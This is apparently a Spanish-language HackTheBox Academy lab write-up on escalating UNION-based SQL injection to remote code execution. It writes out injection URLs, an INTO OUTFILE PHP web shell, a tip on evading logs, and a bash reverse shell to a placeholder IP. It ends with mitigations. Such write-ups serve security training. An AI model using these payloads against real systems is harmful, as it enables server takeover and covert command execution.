---
title: "SQLi — INTO OUTFILE Web Shell"
platform: "HackTheBox"
os: "Linux"
difficulty: "Hard"
ip: "154.57.164.80:32366"
slug: "sqli-into-outfile-web-shell"
author: "Z4k7"
date: "2026-03-27"
year: "2026"
status: "pwned"
tags:
  - "lab"
  - "sqli"
  - "file"
  - "webshell"
  - "rce"
techniques:
  - "UNION injection"
  - "INTO OUTFILE"
  - "file write"
  - "web shell PHP"
  - "RCE"
tools:
  - "browser"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Ejercicio del módulo SQL Injection Fundamentals de HTB Academy. Escalada de UNION-based SQLi a Remote Code Execution via escritura de web shell PHP usando INTO OUTFILE. Verificación de secure_file_priv, prueba de escritura en /tmp y webroot, despliegue de shell PHP y ejecución de comandos.  ---"
steps:

  - id: "recon_1"
    num: "01"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          validamos la la cantidad de columnas permitidas por medio de `UNION SELECT`
          consulta
      - kind: "code"
        lang: "SQL"
        code: |
          http://154.57.164.80:32366/search.php?port_code=a%27UNION%20SELECT%20NULL,NULL,NULL,NULL%20--%20-
      - kind: "image"
        src: "assets/images/sqli/file-20260324201748252.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validamos el usuario actual de la BD
      - kind: "code"
        lang: "SQL"
        code: |
          http://154.57.164.80:32366/search.php?port_code=a%27UNION%20SELECT%20NULL,USER(),NULL,NULL%20--%20-
      - kind: "image"
        src: "assets/images/sqli/file-20260324201833997.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          podemos comprobar si tenemos privilegios de superadministrador con la siguiente consulta:
      - kind: "code"
        lang: "SQL"
        code: |
          http://154.57.164.80:32366/search.php?port_code=a%27UNION%20SELECT%20NULL,super_priv,NULL,NULL%20FROM%20mysql.user%20--%20-
      - kind: "image"
        src: "assets/images/sqli/file-20260324202147804.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          También podemos volcar otros privilegios que tenemos directamente desde el esquema, con la siguiente consulta:
      - kind: "code"
        lang: "SQL"
        code: |
          http://154.57.164.80:32366/search.php?port_code=a%27UNION%20SELECT%201,grantee,privilege_type,NULL%20FROM%20information_schema.user_privileges--%20-
      - kind: "image"
        src: "assets/images/sqli/file-20260324202759298.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Se confirma que tenemos acceso a file
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Para escribir archivos necesitas TRES cosas: (1) privilegio FILE, (2) `secure_file_priv` vacío o apuntando al directorio objetivo, (3) permisos de escritura del OS en el path destino. Muchos juniors verifican solo (1) y se frustran cuando INTO OUTFILE falla silenciosamente."

  - id: "enum_1"
    num: "02"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          consulta si contamos con `secure_file_priv`
      - kind: "code"
        lang: "SQL"
        code: |
          http://154.57.164.80:32366/search.php?port_code=a%27UNION%20SELECT%201,%20variable_name,%20variable_value,%204%20FROM%20information_schema.global_variables%20where%20variable_name=%22secure_file_priv%22--%20-
      - kind: "image"
        src: "assets/images/sqli/file-20260324210602209.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          validamos que contamos con el permiso `secure_file_priv`
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "`secure_file_priv` vacío `''` = jackpot — escritura libre en todo el sistema de archivos (limitado solo por permisos del OS). Si es NULL, escritura deshabilitada. Si tiene un path, solo puedes escribir ahí — inútil para web shell."

  - id: "exploit_1"
    num: "03"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          cargar archivo por medio de `INTO OUTFILE '/tmp/test.txt`
      - kind: "code"
        lang: "SQL"
        code: |
          http://154.57.164.80:32366/search.php?port_code=a%27UNION%20SELECT%201,%20%27validacion%20de%20ingreso%20z4k%27,3,%204%20INTO%20OUTFILE%20%22/tmp/test.txt%22--%20-
      - kind: "image"
        src: "assets/images/sqli/file-20260324211106735.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/sqli/file-20260324211206683.jpg"
        caption: "Evidencia técnica"
      - kind: "code"
        lang: "SQL"
        code: |
          http://154.57.164.68:31038/search.php?port_code=aa%27%20UNION%20SELECT%201,%27file%20written%20successfully!%27,3,4%20into%20outfile%20%27/var/www/html/proof.txt%27--%20-
      - kind: "image"
        src: "assets/images/sqli/file-20260324212447840.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          aplicamos un rever shell.php
      - kind: "code"
        lang: "SQL"
        code: |
          http://154.57.164.68:31038/search.php?port_code=aa%27%20UNION%20SELECT%201,%27%3C?php%20system($_REQUEST[0]);%20?%3E%27,3,4%20into%20outfile%20%27/var/www/html/proof.php%27--%20-
      - kind: "image"
        src: "assets/images/sqli/file-20260324213010910.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/sqli/file-20260325164519933.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/sqli/file-20260324213152167.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Web shell en `$_REQUEST[0]` acepta tanto GET como POST — útil para evadir logs básicos enviando el comando via POST. En un engagement real, después de confirmar RCE con `id`, escala a reverse shell interactiva: `bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'`"

lessons:
  - 'La cadena FILE privilege → secure_file_priv vacío → escritura en webroot → web shell → RCE'
  - 'Siempre probar escritura en `/tmp` primero antes de intentar el webroot'
  - '`<?php system($_REQUEST[0]); ?>` es el web shell PHP más minimalista y funcional'
mitigation:
  - 'Configurar `secure_file_priv` fuera del webroot'
  - 'El usuario `mysql` no debe tener acceso de escritura al webroot'
  - 'Monitorear creación de archivos `.php` en el webroot'
---
